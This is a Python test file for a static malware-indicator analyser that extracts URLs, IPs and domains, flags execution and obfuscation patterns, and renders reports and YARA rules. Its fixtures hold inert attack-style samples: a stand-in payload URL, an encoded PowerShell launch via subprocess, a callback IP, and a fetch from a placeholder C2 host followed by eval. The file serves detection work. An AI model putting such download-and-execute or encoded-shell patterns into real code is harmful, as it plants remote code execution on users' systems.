from loop_engineering.static_code_analysis import (
    analyze_source_text,
    render_static_code_blog_markdown,
    render_static_code_markdown,
    render_static_code_yara,
)


def test_static_analysis_extracts_iocs_and_execution_patterns():
    text = """
import os, subprocess
url = "http://evil.example/payload"
subprocess.Popen(["powershell", "-enc", "SQBFAFgA"])
eval("print(1)")
callback = "192.0.2.10"
"""

    report = analyze_source_text(text, language_hint="python")

    assert "http://evil.example/payload" in report.urls
    assert "192.0.2.10" in report.ips
    assert "evil.example" in report.domains
    categories = {finding.category for finding in report.findings}
    assert "dynamic_execution" in categories
    assert "shell_execution" in categories
    assert "powershell_cradle" in categories


def test_static_analysis_reports_obfuscation_without_execution():
    blob = "A" * 120
    report = analyze_source_text(f"payload = '{blob}'", language_hint="javascript")

    assert any(finding.category == "obfuscation" for finding in report.findings)
    markdown = render_static_code_markdown(report)
    assert "static text analysis only" in markdown


def test_static_analysis_generates_blog_and_yara():
    report = analyze_source_text('fetch("https://c2.example/a"); eval(code)', language_hint="javascript")

    blog = render_static_code_blog_markdown(report)
    yara = render_static_code_yara(report)

    assert "What The Agent Did" in blog
    assert "IOCs" in blog
    assert "YARA Rules" in blog
    assert "Static_Source_Malware_Indicators" in yara
    assert "c2.example" in yara
